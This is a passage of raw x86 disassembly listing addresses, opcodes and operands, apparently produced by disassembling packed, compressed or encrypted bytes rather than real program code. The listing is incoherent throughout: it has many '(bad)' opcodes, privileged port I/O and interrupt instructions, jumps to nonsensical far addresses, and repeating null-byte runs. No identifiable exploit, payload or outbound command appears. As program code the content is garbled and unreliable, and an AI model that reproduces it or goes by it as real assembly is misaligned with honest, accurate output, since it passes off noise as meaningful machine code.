  432773:	mov    esp,0x73e10c0c
  432778:	cld    
  432779:	sbb    edx,DWORD PTR [esi+ebp*8-0x1]
  43277d:	push   ecx
  43277e:	sbb    dh,ch
  432780:	jne    0x432756
  432782:	std    
  432783:	aas    
  432784:	(bad)  
  432785:	mov    ebx,0xc7d884e1
  43278a:	retf   0xc083
  43278d:	xchg   ecx,eax
  43278e:	sbb    eax,DWORD PTR [ecx+0xe665f01]
  432794:	inc    eax
  432795:	pop    esi
  432796:	cmp    DWORD PTR [ecx-0x40],edi
  432799:	add    BYTE PTR [eax],al
  43279b:	add    BYTE PTR [eax],al
  43279d:	add    BYTE PTR [esp+edi*8-0x248a7503],bl
  4327a4:	sti    
  4327a5:	mov    WORD PTR [ecx],?
  4327a7:	sub    eax,0x9484870e
  4327ac:	cmp    esp,DWORD PTR [esi]
  4327ae:	scas   eax,DWORD PTR es:[edi]
  4327af:	xchg   esp,eax
  4327b0:	int    0x13
  4327b2:	imul   BYTE PTR [edx+0x13]
  4327b5:	aaa    
  4327b6:	mov    edi,0xee51f510
  4327bb:	cmp    esi,esi
  4327bd:	inc    BYTE PTR [ebp-0x14a6d21c]
  4327c3:	sub    eax,0xfc36bfed
  4327c8:	inc    ebx
  4327c9:	out    0x8a,al
  4327cb:	xchg   esp,eax
  4327cc:	sti    
  4327cd:	ss test eax,0x8274fbff
  4327d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4327d4:	mov    ebx,0x3c9f403
  4327d9:	add    BYTE PTR [ebp+0x7b],dh
  4327dc:	jmp    0x432829
  4327de:	xchg   ecx,eax
  4327df:	daa    
  4327e0:	stos   BYTE PTR es:[edi],al
  4327e1:	or     al,0xfe
  4327e3:	pop    esi
  4327e4:	fiadd  DWORD PTR [ebx]
  4327e6:	sbb    eax,0x22fa22c1
  4327eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4327ec:	inc    ebx
  4327ed:	je     0x432828
  4327ef:	in     eax,dx
  4327f0:	idiv   edi
  4327f2:	test   eax,0xfe5017a4
  4327f7:	pusha  
  4327f8:	repnz dec esi
  4327fa:	stos   BYTE PTR es:[edi],al
  4327fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4327fc:	ds jae 0x43278e
  4327ff:	lods   al,BYTE PTR ds:[esi]
  432800:	ds std 
  432802:	add    BYTE PTR [eax],al
  432804:	add    BYTE PTR [eax],al
  432806:	add    BYTE PTR [edx+0x43],al
  432809:	mov    ds:0x7547e8a3,eax
  43280e:	imul   esp
  432810:	mov    ebp,0xceda8427
  432815:	retf   
  432816:	icebp  
  432817:	cmp    esp,DWORD PTR [edi]
  432819:	add    ecx,DWORD PTR [ebp+0x3aaa3b2b]
  43281f:	ret    0x1b01
  432822:	cld    
  432823:	rol    al,cl
  432825:	inc    esp
  432826:	sub    BYTE PTR [edi-0x507f6f74],ch
  43282c:	(bad)  
  43282d:	iret   
  43282e:	es lea ebp,fs:[edx]
  432832:	cld    
  432833:	lahf   
  432834:	mov    ?,eax
  432836:	sbb    edx,DWORD PTR [eax+0x18]
  432839:	jno    0x432861
  43283b:	(bad)  
  43283c:	mov    gs,WORD PTR [edx+edi*2+0x34]
  432840:	push   es
  432841:	bound  ebp,QWORD PTR [ebp-0x45c748e]
  432847:	mov    DWORD PTR [ebp-0x5bad0455],0xb05f2665
  432851:	ins    DWORD PTR es:[edi],dx
  432852:	dec    ebx
  432853:	push   edx
  432854:	rol    BYTE PTR [eax+ebp*1+0x42d844f],1
  43285b:	ror    BYTE PTR [esi+edi*1],0xe1
  43285f:	sti    
  432860:	shl    al,0xec
  432863:	mov    ah,0x6
  432865:	xchg   ebp,eax
  432866:	adc    ebp,DWORD PTR [esi]
  432868:	mov    ss,WORD PTR [ebx+ebx*1]
  43286b:	add    BYTE PTR [eax],al
  43286d:	add    BYTE PTR [eax],al
  43286f:	add    BYTE PTR [edx+0x53260b5e],cl
  432875:	inc    edx
  432876:	mov    eax,ds:0xe4452dca
  43287b:	add    ecx,DWORD PTR [esi]
  43287d:	shl    ecx,1
  43287f:	scas   eax,DWORD PTR es:[edi]
  432880:	jb     0x4328ac
  432882:	in     al,dx
  432883:	daa    
  432884:	call   DWORD PTR [edi]
  432886:	ins    DWORD PTR es:[edi],dx
  432887:	mov    dh,0x6e
  432889:	mov    esp,DWORD PTR [ebx]
  43288b:	sub    BYTE PTR [esi+edi*8-0x370dfc20],dh
  432892:	fdivr  QWORD PTR ds:0x3e80a36
  432898:	shl    BYTE PTR [esi],cl
  43289a:	adc    cl,ch
  43289c:	iret   
  43289d:	mov    ?,edi
  43289f:	or     al,0x65
  4328a1:	out    0xfa,eax
  4328a3:	scas   al,BYTE PTR es:[edi]
  4328a4:	add    eax,0x5a613e4
  4328a9:	in     al,0x13
  4328ab:	xchg   ecx,eax
  4328ac:	xchg   esp,eax
  4328ad:	sbb    al,0xfa
  4328af:	xchg   esi,eax
  4328b0:	sub    al,0x27
  4328b2:	test   BYTE PTR [edi-0x205101b],dl
  4328b8:	mov    edx,0x59bee80b
  4328bd:	sbb    al,0xfa
  4328bf:	bound  ebx,QWORD PTR [ecx+0x7e]
  4328c2:	cli    
  4328c3:	cmc    
  4328c4:	jg     0x432944
  4328c6:	(bad)  
  4328c7:	fnstsw WORD PTR [ebx-0x80]
  4328ca:	inc    ecx
  4328cb:	in     eax,dx
  4328cc:	out    dx,eax
  4328cd:	sbb    BYTE PTR [ebp-0x4246cfd2],al
  4328d3:	fld    QWORD PTR [eax]
  4328d5:	add    BYTE PTR [eax],al
  4328d7:	add    BYTE PTR [eax],al
  4328d9:	jbe    0x432888
  4328db:	xchg   BYTE PTR [ebp-0xa],dl
  4328de:	sub    cl,BYTE PTR [ebx]
  4328e0:	call   0xad352b5b
  4328e5:	inc    edx
  4328e6:	add    cl,BYTE PTR [edi-0x69]
  4328e9:	xor    DWORD PTR [eax-0x7cbe0e84],eax
  4328ef:	mov    ecx,gs
  4328f1:	jbe    0x4328f5
  4328f3:	das    
  4328f4:	sub    DWORD PTR [esp+ecx*2+0x1c5b47e7],ebp
  4328fb:	cli    
  4328fc:	jb     0x43295f
  4328fe:	jle    0x4328f1
  432900:	jne    0x4328da
  432902:	dec    edi
  432903:	(bad)  
  432904:	call   0xafc1bb7f
  432909:	jbe    0x432899
  43290b:	pop    ebp
  43290c:	jb     0x4328c6
  43290e:	add    ch,BYTE PTR [ecx+0x676e9]
  432914:	pop    esp
  432915:	mov    ecx,0xa6cefadd
  43291a:	sbb    al,0x88
  43291c:	add    BYTE PTR [edx+0x45c31b02],cl
  432922:	pop    eax
  432923:	push   es
  432924:	mov    ebx,DWORD PTR [edx]
  432926:	cli    
  432927:	push   ss
  432928:	mov    edx,esp
  43292a:	sub    DWORD PTR [eax],ecx
  43292c:	jne    0x4328e8
  43292e:	cdq    
  43292f:	inc    edx
  432930:	add    al,0xbf
  432932:	fnstenv [ecx]
  432934:	dec    ebp
  432935:	nop
  432936:	addr16 push es
  432938:	test   DWORD PTR [edx+eax*1+0x0],0x0
  432940:	add    BYTE PTR [eax],al
  432942:	mov    ds:0x1f107502,al
  432947:	and    edi,edx
  432949:	mov    dl,bl
  43294b:	cli    
  43294c:	push   edx
  43294d:	(bad)  
  43294e:	adc    ebx,esi
  432950:	add    eax,0xffffff99
  432953:	retf   
  432954:	loope  0x432977
  432956:	fbstp  TBYTE PTR [edi]
  432958:	cli    
  432959:	mov    dl,BYTE PTR [esi+edx*1]
  43295c:	in     eax,dx
  43295d:	ror    DWORD PTR [edx+eax*1+0x8],0x0
  432962:	sbb    BYTE PTR ds:0xfb5c2079,dl
  432968:	or     BYTE PTR [ecx-0xf0a2143],al
  43296e:	xchg   ebx,eax
  43296f:	cwde   
  432970:	inc    edx
  432971:	add    al,0x67
  432973:	add    bh,BYTE PTR [ebx+0x26]
  432976:	sbb    al,0x9b
  432978:	ror    BYTE PTR [ebx-0x1dd06ad],0x73
  43297f:	fiadd  WORD PTR [ecx+0x73e789f0]
  432985:	xchg   esi,esp
  432987:	and    eax,0x28030864
  43298c:	jmp    0xb815:0xf701cfca
  432993:	or     al,0x3a
  432995:	add    BYTE PTR [edi-0x2a],ah
  432998:	xchg   DWORD PTR [ebp+0x75],ebx
  43299b:	pop    ds
  43299c:	xchg   DWORD PTR [edi+0xf59f72],edi
  4329a2:	jne    0x4329cf
  4329a4:	(bad)  
  4329a5:	outs   dx,DWORD PTR ds:[esi]
  4329a6:	add    BYTE PTR [eax],al
  4329a8:	add    BYTE PTR [eax],al
  4329aa:	add    BYTE PTR [ecx+0x5c],ch
  4329ad:	add    eax,0xfe2b7530
  4329b2:	xchg   BYTE PTR [edx-0x60],dh
  4329b5:	int3   
  4329b6:	pop    ss
  4329b7:	in     al,dx
  4329b8:	sar    ebx,cl
  4329ba:	xchg   BYTE PTR [edx-0x3e43370],al
  4329c0:	jecxz  0x4329c1
  4329c2:	cs mov ch,0xa0
  4329c5:	dec    esi
  4329c6:	out    0x10,al
  4329c8:	test   al,0xde
  4329ca:	inc    DWORD PTR [esi]
  4329cc:	loopne 0x432958
  4329ce:	inc    edx
  4329cf:	jge    0x432971
  4329d1:	or     eax,0x13bb57f
  4329d6:	enter  0x36e8,0xa
  4329da:	mov    DWORD PTR [eax+0x14fd2bb7],edi
  4329e0:	scas   al,BYTE PTR es:[edi]
  4329e1:	push   ds
  4329e2:	xchg   al,al
  4329e4:	aaa    
  4329e5:	cmp    BYTE PTR [edi-0xb05896],0x52
  4329ec:	sub    ecx,DWORD PTR [ecx-0xda807f6]
  4329f2:	xchg   BYTE PTR [ebx+0x28],bh
  4329f5:	inc    ecx
  4329f6:	mov    BYTE PTR [ebp-0x70],ch
  4329f9:	into   
  4329fa:	add    edi,esp
  4329fc:	push   edx
  4329fd:	add    al,BYTE PTR [edi+0x478b23ba]
  432a03:	ins    DWORD PTR es:[edi],dx
  432a04:	mov    al,ds:0x52ec0bce
  432a09:	or     al,BYTE PTR [edi-0x3778ec43]
  432a0f:	add    BYTE PTR [eax],al
  432a11:	add    BYTE PTR [eax],al
  432a13:	add    BYTE PTR [ecx-0x4d734cc7],al
  432a19:	cmp    esi,DWORD PTR [ebx-0x6fdca82]
  432a1f:	mov    bl,0xef
  432a21:	out    dx,al
  432a22:	sbb    al,0xfa
  432a24:	stos   BYTE PTR es:[edi],al
  432a25:	add    ah,BYTE PTR [esi+0x47]
  432a28:	outs   dx,BYTE PTR ds:[esi]
  432a29:	mov    DWORD PTR [ebx],esp
  432a2b:	and    BYTE PTR [ebp-0x4],dh
  432a2e:	ins    DWORD PTR es:[edi],dx
  432a2f:	sar    BYTE PTR [edx-0x77],1
  432a32:	mov    eax,ds:0xb1174e2b
  432a37:	and    bh,bl
  432a39:	sbb    DWORD PTR [ebx+0x22],esp
  432a3c:	inc    ecx
  432a3d:	jb     0x432aac
  432a3f:	mov    BYTE PTR [esi-0x2afc1729],0x1
  432a46:	sbb    bl,BYTE PTR [ebx-0x4c47bddd]
  432a4c:	jmp    0x1f6e311
  432a51:	cdq    
  432a52:	enter  0xcad6,0x29
  432a56:	test   BYTE PTR [edx+0x7f],dh
  432a59:	adc    al,0x64
  432a5b:	inc    ebx
  432a5c:	push   es
  432a5d:	mov    ds:0xeedb03ce,eax
  432a62:	mov    ch,0x2b
  432a64:	test   DWORD PTR [esi-0x6a1cddaf],esp
  432a6a:	clc    
  432a6b:	add    esi,edx
  432a6d:	xchg   edi,eax
  432a6e:	fcom   QWORD PTR [edi+0x17633bb9]
  432a74:	dec    esp
  432a75:	adc    al,0x31
  432a77:	pop    es
  432a78:	add    BYTE PTR [eax],al
  432a7a:	add    BYTE PTR [eax],al
  432a7c:	add    BYTE PTR [ebp+0x2],dh
  432a7f:	jmp    0xf1d26a0c
  432a84:	mov    es,WORD PTR [edi-0x78]
  432a87:	adc    eax,0x120ef190
  432a8c:	and    bl,BYTE PTR [edi]
  432a8e:	sub    esp,DWORD PTR [edx+edx*4+0x1f]
  432a92:	adc    al,0x1
  432a94:	cwde   
  432a95:	cmp    BYTE PTR [edi+0x43],0x17
  432a99:	or     al,0x14
  432a9b:	push   ebp
  432a9d:	ja     0x432a24
  432a9f:	test   ch,dh
  432aa1:	push   ebp
  432aa2:	sbb    dl,bh
  432aa4:	rcl    esi,1
  432aa6:	mov    dl,bh
  432aa8:	fdivrp st(2),st
  432aaa:	sbb    BYTE PTR [ebx-0x1a],dh
  432aad:	icebp  
  432aae:	xor    BYTE PTR [esi-0xc811526],al
  432ab4:	(bad)  
  432ab5:	xchg   esp,eax
  432ab6:	sbb    bh,ah
  432ab8:	sbb    eax,0x62fa18e4
  432abd:	mov    edx,0xe9d188ef
  432ac2:	inc    eax
  432ac3:	out    0xf1,al
  432ac5:	jmp    0x8a8c0ce5
  432aca:	sbb    BYTE PTR [esi],ch
  432acc:	test   eax,0xa056b9b4
  432ad1:	xor    eax,DWORD PTR [ebx]
  432ad3:	add    BYTE PTR [edi],bl
  432ad5:	jecxz  0x432ad6
  432ad7:	out    0x37,eax
  432ad9:	push   ss
  432ada:	push   ss
  432adb:	cli    
  432adc:	ins    BYTE PTR es:[edi],dx
  432add:	cmp    DWORD PTR [edi+0x6a02],ecx
  432ae3:	add    BYTE PTR [eax],al
  432ae5:	add    BYTE PTR [ecx-0x5fa67aed],dl
  432aeb:	adc    eax,0x10f2572d
  432af0:	jae    0x432b11
  432af2:	adc    ecx,edi
  432af4:	gs loope 0x432a8c
  432af7:	into   
  432af8:	out    dx,eax
  432af9:	xor    edi,DWORD PTR [eax]
  432afb:	adc    edi,ecx
  432afd:	aam    0x82
  432aff:	add    eax,0xefe940
  432b04:	test   DWORD PTR [ecx],ebp
  432b06:	fucomp st(6)
  432b08:	xchg   BYTE PTR [ebp-0x563d04e6],dh
  432b0e:	and    ah,bl
  432b10:	(bad)  
  432b11:	call   0x6044a68c
  432b16:	sub    edi,esi
  432b18:	xchg   BYTE PTR [eax],al
  432b1a:	(bad)  
  432b1b:	in     eax,0x8
  432b1d:	push   eax
  432b1e:	mov    ebx,DWORD PTR fs:[edi-0x1da6f403]
  432b25:	(bad)  
  432b26:	lods   eax,DWORD PTR ds:[esi]
  432b27:	repz cmc 
  432b29:	xor    ebx,DWORD PTR [ecx+eax*2]
  432b2c:	mov    esp,0x814bdc04
  432b31:	in     al,dx
  432b32:	dec    ebp
  432b33:	jecxz  0x432b47
  432b35:	add    esp,ecx
  432b37:	dec    BYTE PTR [ebp-0x75]
  432b3a:	or     eax,0x51f8815a
  432b3f:	stc    
  432b40:	add    eax,0xffff1a84
  432b45:	call   FWORD PTR [ecx]
  432b47:	dec    edx
  432b48:	retf   0x3d
  432b4b:	add    BYTE PTR [eax],al
  432b4d:	add    BYTE PTR [eax],al
  432b4f:	in     al,dx
  432b50:	loope  0x432ae7
  432b52:	add    BYTE PTR [ebx-0x73ff4577],bl
  432b58:	inc    BYTE PTR [edx-0x258247bb]
  432b5e:	add    DWORD PTR ds:0xad75063c,eax
  432b64:	pop    ecx
  432b65:	push   eax
  432b66:	call   0x3ecb37
  432b6b:	pop    ss
  432b6c:	out    dx,eax
  432b6d:	xor    esi,0x6b
  432b70:	mov    bl,BYTE PTR [esi+0x7b065c00]
  432b76:	jge    0x432bcc
  432b78:	push   es
  432b79:	je     0x432bc0
  432b7b:	stos   DWORD PTR es:[edi],eax
  432b7c:	js     0x432b80
  432b7e:	add    DWORD PTR [ecx],0xffffffde
  432b81:	clc    
  432b82:	dec    DWORD PTR [ebx-0x4b7a72fb]
  432b88:	jecxz  0x432b7f
  432b8a:	push   DWORD PTR [eax+ecx*2-0x77a40078]
  432b91:	cmc    
  432b92:	je     0x432baf
  432b94:	jg     0x432b63
  432b96:	mov    esi,DWORD PTR [ebp-0x17]
  432b99:	mov    DWORD PTR [ebp+ecx*1+0x1dfa2002],eax
  432ba0:	or     DWORD PTR [edi-0x7e16f506],0xffffffe7
  432ba7:	add    ebx,DWORD PTR [ecx]
  432ba9:	sbb    al,BYTE PTR [ebx]
  432bab:	jne    0x432bc8
  432bad:	inc    BYTE PTR [edx+esi*8+0x870aaf]
  432bb4:	add    BYTE PTR [eax],al
  432bb6:	add    BYTE PTR [eax],al
  432bb8:	ret    0x4994
  432bbb:	mov    eax,?
  432bbd:	inc    ebx
  432bbe:	sbb    edx,edi
  432bc0:	fiadd  DWORD PTR [ebx-0x41]
  432bc3:	mov    dl,dl
  432bc5:	dec    eax
  432bc6:	xchg   BYTE PTR [ecx+0x61],al
  432bc9:	add    al,0x43
  432bcb:	je     0x432c08
  432bcd:	pushf  
  432bce:	inc    ebx
  432bcf:	iret   
  432bd0:	and    eax,0x452fc1ae
  432bd5:	xchg   esi,eax
  432bd6:	mov    al,ds:0x2b5b66ef
  432bdb:	jns    0x432bb0
  432bdd:	js     0x432bf9
  432bdf:	xor    DWORD PTR [ebp+0x6565d3f7],0xffffff96
  432be6:	rcr    DWORD PTR [edi],0x25
  432be9:	xchg   esp,eax
  432bea:	inc    edx
  432beb:	dec    edi
  432bec:	sub    BYTE PTR [esi],0xc2
  432bef:	adc    DWORD PTR ds:0x81c37d1b,esi
  432bf5:	sahf   
  432bf6:	inc    ebx
  432bf7:	je     0x432b88
  432bf9:	xor    eax,0x7b16e802
  432bfe:	and    dl,bh
  432c00:	lock ficom DWORD PTR [edi+0x3faf604]
  432c07:	out    0x77,eax
  432c09:	or     al,0x3e
  432c0b:	test   BYTE PTR ds:0x8589024f,dh
  432c11:	les    ecx,FWORD PTR [ecx]
  432c13:	jg     0x432bc5
  432c15:	add    dh,ch
  432c17:	add    esp,DWORD PTR [eax+0x2bb308]
  432c1d:	add    BYTE PTR [eax],al
  432c1f:	add    BYTE PTR [eax],al
  432c21:	(bad)  
  432c22:	popa   
  432c23:	adc    ebx,DWORD PTR [edi]
  432c25:	dec    ebx
  432c26:	inc    edx
  432c27:	test   eax,0xf0443dbd
  432c2c:	add    edi,DWORD PTR [ecx]
  432c2e:	ds sub al,0x50
  432c31:	cs ds fwait
  432c34:	mov    cl,BYTE PTR [esi]
  432c36:	mov    bl,0x5d
  432c38:	into   
  432c39:	mov    ?,WORD PTR [ebp+0x3a]
  432c3c:	or     BYTE PTR [ebx+0x3],dl
  432c3f:	ins    BYTE PTR es:[edi],dx
  432c40:	enter  0xb1df,0x39
  432c44:	mov    ch,0xdf
  432c46:	xor    esp,DWORD PTR [ebp+0x47]
  432c49:	add    BYTE PTR [ebp+0x14004c0],0xea
  432c50:	push   ebp
  432c51:	cmp    DWORD PTR [ecx],edx
  432c53:	pop    ebp
  432c54:	shl    BYTE PTR [edx+0x7b],1
  432c57:	out    0xd2,eax
  432c59:	bnd jl 0x432be7
  432c5c:	shr    bl,0x7c
  432c5f:	xor    al,BYTE PTR [eax]
  432c61:	cli    
  432c62:	(bad)  
  432c63:	lock mov dh,0x28
  432c66:	adc    DWORD PTR [eax+0x79f9b682],edi
  432c6c:	cmp    esp,DWORD PTR [ebx+0x42]
  432c6f:	ins    DWORD PTR es:[edi],dx
  432c70:	sub    BYTE PTR [ecx],ah
  432c72:	inc    ebp
  432c73:	sbb    ecx,DWORD PTR [ebx-0x49ea4d72]
  432c79:	(bad)  
  432c7a:	jnp    0x432cdc
  432c7c:	nop
  432c7d:	mov    cl,0xe
  432c7f:	ins    DWORD PTR es:[edi],dx
  432c80:	adc    al,0xb2
  432c82:	inc    edi
  432c83:	stos   DWORD PTR es:[edi],eax
  432c84:	pop    ds
  432c85:	add    BYTE PTR [eax],al
  432c87:	add    BYTE PTR [eax],al
  432c89:	add    BYTE PTR [edx+0x10],bl
  432c8c:	call   0x41a98994
  432c91:	push   ds
  432c92:	dec    edi
  432c93:	jl     0x432c30
  432c95:	pop    ds
  432c96:	ret    
  432c97:	inc    esi
  432c98:	(bad)  
  432c99:	in     al,dx
  432c9a:	in     eax,dx
  432c9b:	dec    edi
  432c9c:	je     0x432ca3
  432c9e:	add    al,0xbf
  432ca0:	sti    
  432ca1:	mov    eax,0x1efa7d5e
  432ca6:	adc    DWORD PTR [eax+0x4fededc3],0x74
  432cad:	cmc    
  432cae:	push   DWORD PTR [esi+0x82572fb]
  432cb4:	pop    ebx
  432cb5:	sub    BYTE PTR [edi+eax*1+0x7],dl
  432cb9:	sbb    bh,BYTE PTR [eax-0x6def86]
  432cbf:	es pop esp
  432cc1:	stos   BYTE PTR es:[edi],al
  432cc2:	cld    
  432cc3:	mov    dh,0x7
  432cc5:	and    eax,DWORD PTR ds:[ebp-0x3]
  432cc9:	call   0x32432f44
  432cce:	cld    
  432ccf:	es pop esp
  432cd1:	stos   BYTE PTR es:[edi],al
  432cd2:	and    eax,0x25adcb3b
  432cd7:	cmp    ecx,ebx
  432cd9:	sbb    al,0xec
  432cdb:	sbb    edx,DWORD PTR [eax+0x1a]
  432cde:	jmp    0x432c94
  432ce0:	xchg   BYTE PTR [ecx+0x72fbc6fa],ah
  432ce6:	xchg   BYTE PTR [edi+0xf552cc2],bh
  432cec:	cli    
  432ced:	jmp    0x432cf2
  432cf2:	add    BYTE PTR [esi+0x1a],dh
  432cf5:	inc    esp
  432cf6:	xchg   BYTE PTR [eax+0xc],ch
  432cf9:	xchg   BYTE PTR [edx*2-0x12123c70],ch
  432d00:	sub    al,BYTE PTR [ecx+ebp*4-0x4b7303f6]
  432d07:	mov    dh,BYTE PTR [edx+0xc8019e7]
  432d0d:	cli    
  432d0e:	bound  ebp,QWORD PTR [edx]
  432d10:	or     edi,DWORD PTR [esi+0x25]
  432d13:	jge    0x432c9c
  432d15:	rol    BYTE PTR [eax],1
  432d17:	popf   
  432d18:	in     al,0x2
  432d1a:	or     edx,DWORD PTR [esi+0x5375ba87]
  432d20:	add    BYTE PTR [ebx-0x4],0xc
  432d24:	fist   DWORD PTR [eax]
  432d26:	call   DWORD PTR [ebx-0x13]
  432d29:	or     DWORD PTR [ebp-0x80],0x4d04be81
  432d30:	jecxz  0x432d3c
  432d32:	or     eax,DWORD PTR [ebp-0x79]
  432d35:	mov    edx,0x4b803875
  432d3a:	cld    
  432d3b:	fstp   st(2)
  432d3d:	clc    
  432d3e:	inc    BYTE PTR [ebx]
  432d40:	out    dx,al
  432d41:	jns    0x432d07
  432d43:	fadd   DWORD PTR [edi+0x79e875ba]
  432d49:	push   ebx
  432d4a:	cld    
  432d4b:	addr16 inc eax
  432d4d:	add    bl,BYTE PTR [edi+0xd]
  432d50:	loope  0x432d64
  432d52:	add    ecx,DWORD PTR [edi]
  432d54:	dec    ebp
  432d55:	xchg   DWORD PTR [ecx],edx
  432d57:	add    BYTE PTR [eax],al
  432d59:	add    BYTE PTR [eax],al
  432d5b:	add    BYTE PTR [edi+0xf5de379],dl
  432d61:	jp     0x432db6
  432d63:	or     BYTE PTR [ebx+0x50],ah
  432d66:	mov    ebp,0x29c02
  432d6b:	add    BYTE PTR [edi],dh
  432d6d:	jns    0x432d52
  432d6f:	pop    ebp
  432d70:	iret   
  432d71:	mov    esi,0x7959ccc6
  432d76:	out    0x83,al
  432d78:	adc    bh,bh
  432d7a:	dec    edx
  432d7b:	push   esi
  432d7c:	imul   edi,DWORD PTR [ecx-0xe],0xffffff8d
  432d80:	pop    ecx
  432d81:	loop   0x432d04
  432d83:	icebp  
  432d84:	pop    esp
  432d85:	lds    eax,FWORD PTR [ebx-0x4]
  432d88:	pop    esp
  432d89:	add    al,BYTE PTR [eax]
  432d8b:	add    ah,al
  432d8d:	mov    dl,0xf8
  432d8f:	inc    ebx
  432d91:	jp     0x432d55
  432d93:	mov    esi,DWORD PTR [ebp+0x5e]
  432d96:	sbb    bl,BYTE PTR [eax-0x78fd180a]
  432d9c:	sub    eax,0xf8f7b193
  432da1:	rcl    BYTE PTR [ecx+0x1a66e809],cl
  432da7:	push   eax
  432da8:	sbb    eax,0x2afa1cb4
  432dad:	cdq    
  432dae:	inc    edx
  432daf:	add    ebp,esi
  432db1:	rol    DWORD PTR [edi+0xb931944],cl
  432db7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432db8:	aaa    
  432db9:	and    al,0x5
  432dbb:	push   ebp
  432dbc:	or     eax,0x71edb
  432dc1:	add    BYTE PTR [eax],al
  432dc3:	add    BYTE PTR [eax],al
  432dc5:	outs   dx,BYTE PTR ds:[esi]
  432dc6:	jecxz  0x432d49
  432dc8:	enter  0x2580,0x89
  432dcc:	push   esp
  432dcd:	icebp  
  432dce:	imul   esp,DWORD PTR [esi],0x1624eb71
  432dd4:	jle    0x432d8f
  432dd6:	daa    
  432dd7:	mov    edi,eax
  432dd9:	out    dx,al
  432dda:	ficom  WORD PTR [edi]
  432ddc:	cwde   
  432ddd:	add    BYTE PTR [edi-0x1183f0bf],0x1b
  432de4:	rcl    ch,0x2b
  432de7:	or     eax,ebx
  432de9:	lock bound edx,QWORD PTR [eax+0x17e70009]
  432df0:	dec    edi
  432df1:	popf   
  432df2:	iret   
  432df3:	adc    eax,0x3f98a2fa
  432df8:	add    ebp,esi
  432dfa:	arpl   WORD PTR [edx+0x6929144],cx
  432e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432e01:	mov    bh,0x23
  432e03:	or     edx,DWORD PTR [ebp+0x7d]
  432e06:	pop    edx
  432e07:	and    edx,DWORD PTR [edi]
  432e09:	outs   dx,BYTE PTR ds:[esi]
  432e0a:	jae    0x432d8c
  432e0c:	enter  0x2de8,0x87
  432e10:	dec    esp
  432e11:	imul   eax,DWORD PTR [edx],0xc902bb8
  432e17:	pop    ecx
  432e18:	sbb    ebx,ebx
  432e1a:	inc    esi
  432e1b:	in     al,dx
  432e1c:	mov    ?,WORD PTR [edx]
  432e1e:	jns    0x432dc3
  432e20:	pop    ss
  432e21:	in     eax,dx
  432e22:	cli    
  432e23:	stos   DWORD PTR es:[edi],eax
  432e24:	sbb    edi,ecx
  432e26:	cmp    dh,BYTE PTR [ebx+0x9]
  432e2c:	add    BYTE PTR [eax],al
  432e2e:	call   0x1af962e9
  432e33:	jmp    0x432e5f
  432e35:	sbb    ebp,DWORD PTR [edi]
  432e37:	sub    DWORD PTR [eax+eax*1],0xc16d39fa
  432e3e:	push   ds
  432e3f:	imul   esp,DWORD PTR [edi],0x24
  432e42:	jp     0x432e3f
  432e44:	mov    ds:0x7b3af11b,eax
  432e49:	or     eax,esi
  432e4b:	(bad)  
  432e4c:	cld    
  432e4d:	mov    bl,0x12
  432e4f:	psllq  mm3,QWORD PTR [edx]
  432e52:	out    dx,eax
  432e53:	and    BYTE PTR [eax+eax*1],0xf2
  432e57:	cmp    DWORD PTR [ebp-0x40],ebp
  432e5a:	fisubr WORD PTR [edx-0x59]
  432e5d:	and    ebp,DWORD PTR [edx-0x5]
  432e60:	sub    ebx,DWORD PTR [ecx+edi*8]
  432e63:	cmp    dl,BYTE PTR [ebx-0x29]
  432e66:	stc    
  432e67:	mov    esi,0x22dab4c4
  432e6c:	mov    ebx,0xa078bf1a
  432e71:	xchg   BYTE PTR [esi+0x214c6405],dh
  432e77:	jecxz  0x432ee6
  432e79:	rcr    BYTE PTR [esi-0xccc9296],0xc6
  432e80:	loopne 0x432e58
  432e82:	test   al,bh
  432e84:	xchg   ebp,eax
  432e85:	inc    esp
  432e86:	test   al,0xe9
  432e88:	in     eax,dx
  432e89:	mov    al,0x8a
  432e8b:	lods   al,BYTE PTR ds:[esi]
  432e8c:	outs   dx,DWORD PTR ds:[esi]
  432e8d:	rcr    DWORD PTR [ebx+edi*2],cl
  432e90:	call   FWORD PTR [eax]
  432e92:	add    BYTE PTR [eax],al
  432e94:	add    BYTE PTR [eax],al
  432e96:	add    BYTE PTR [ebp-0x7d],dh
  432e99:	rcl    BYTE PTR [edx],0xfa
  432e9c:	es pop esp
  432e9e:	sub    dh,bl
  432ea0:	mov    BYTE PTR [edi],0xbe
  432ea3:	sbb    al,0x41
  432ea5:	(bad)  
  432ea6:	call   0x26433121
  432eab:	add    BYTE PTR ss:[eax],al
  432eae:	jmp    0x28ca3129
  432eb3:	sti    
  432eb4:	test   ah,ah
  432eb6:	xchg   esp,eax
  432eb7:	mov    ebx,0xb21dcb37
  432ebc:	aaa    
  432ebd:	retf   
  432ebe:	xor    eax,0x2dcb37ba
  432ec3:	mov    dl,0x37
  432ec5:	retf   
  432ec6:	mov    esp,0xfd7e1803
  432ecb:	sub    edi,DWORD PTR [ebp-0x4f855b7a]
  432ed1:	push   edx
  432ed2:	jb     0x432eb1
  432ed4:	add    ebp,DWORD PTR [edi]
  432ed6:	jmp    DWORD PTR [ecx]
  432ed8:	push   cs
  432ed9:	push   esp
  432eda:	xchg   edi,eax
  432edb:	and    esi,DWORD PTR [ecx+0x8852cc2]
  432ee1:	cli    
  432ee2:	jmp    0xd1b7a85d
  432ee7:	(bad)  
  432ee8:	xchg   esi,eax
  432ee9:	jecxz  0x432f4b
  432eeb:	cli    
  432eec:	and    esp,edi
  432eee:	jge    0x432e8f
  432ef0:	or     edi,edx
  432ef2:	push   0x35
  432ef4:	out    dx,eax
  432ef5:	test   BYTE PTR [ecx+0xf5b0505],ch
  432efb:	add    BYTE PTR [eax],al
  432efd:	add    BYTE PTR [eax],al
  432eff:	add    al,al
  432f01:	dec    ebx
  432f02:	cs mov ebx,0x3ce484e0
  432f08:	xor    BYTE PTR [edx+edx*2-0x368f7f],bh
  432f0f:	call   0xc1450d
  432f14:	sar    dh,1
  432f16:	sbb    al,0x5
  432f19:	push   ebx
  432f1a:	(bad)  
  432f1b:	mov    DWORD PTR [ecx-0x21],ebp
  432f1e:	cmp    edi,0x63
  432f21:	adc    eax,0xedcd086c
  432f26:	cmc    
  432f27:	dec    DWORD PTR [edi+edi*8+0x6a]
  432f2b:	or     ch,dl
  432f2d:	push   ebx
  432f2e:	out    dx,al
